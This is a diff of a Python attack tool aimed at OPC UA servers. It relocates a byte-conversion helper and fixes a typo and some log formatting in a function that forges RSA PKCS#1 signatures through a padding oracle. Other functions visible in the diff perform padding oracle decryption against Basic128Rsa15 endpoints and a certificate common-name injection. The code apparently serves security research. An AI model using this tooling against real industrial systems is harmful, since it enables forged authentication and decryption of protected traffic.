@@ -652,18 +652,6 @@ class PasswordPaddingOracle(PaddingOracle):
         ep.transportProfileUri.endswith('uatcp-uasc-uabinary')
       )
     )
-    
-def int2bytes(value : int, outlen : int) -> bytes:
-  # Coverts a nonnegative integer to a fixed-size big-endian binary representation.
-  result = [0] * outlen
-  j = value
-  for ix in reversed(range(0, outlen)):
-    result[ix] = j % 256
-    j //= 256
-    
-  if j != 0:
-    raise ValueError(f'{value} does not fit in {outlen} bytes.') 
-  return bytes(result)
 
 # Carry out a padding oracle attack against a Basic128Rsa15 endpoint.
 # Result is ciphertext**d mod n (encoded big endian; any padding not removed).
@@ -925,6 +913,18 @@ def decrypt_attack(url : str, ciphertext : bytes, try_opn : bool, try_password :
       except:
         pass
   
+def int2bytes(value : int, outlen : int) -> bytes:
+  # Coverts a nonnegative integer to a fixed-size big-endian binary representation.
+  result = [0] * outlen
+  j = value
+  for ix in reversed(range(0, outlen)):
+    result[ix] = j % 256
+    j //= 256
+    
+  if j != 0:
+    raise ValueError(f'{value} does not fit in {outlen} bytes.') 
+  return bytes(result)
+
 
 def forge_signature_attack(url : str, payload : bytes, try_opn : bool, try_password : bool, hasher : str) -> bytes:
   # Use padding oracle to forge an RSA PKCS#1 signature on some arbitrary payload.
@@ -933,13 +933,13 @@ def forge_signature_attack(url : str, payload : bytes, try_opn : bool, try_passw
   oracle, endpoint = find_padding_oracle(url, try_opn, try_password)
   
   # Compute padded hash to be used as 'ciphertext'.
-  sizsize = certificate_publickey(endpoint.serverCertificate).size_in_bytes()
+  sigsize = certificate_publickey(endpoint.serverCertificate).size_in_bytes()
   padhash = pkcs1v15_signature_encode(hasher, payload, sigsize)
-  log(f'Padded hash of payload: {hexlify(padhash)}')
+  log(f'Padded hash of payload: {hexlify(padhash).decode()}')
   log(f'Starting padding oracle attack...')
   sig = rsa_decryptor(oracle, endpoint.serverCertificate, padhash)
   log_success(f'Succes! Forged signature:')
-  log_success(hexlify(sig))
+  log_success(hexlify(sig).decode())
   return sig
   
 def inject_cn_attack(url : str, cn : str, second_login : bool, demo : bool):  
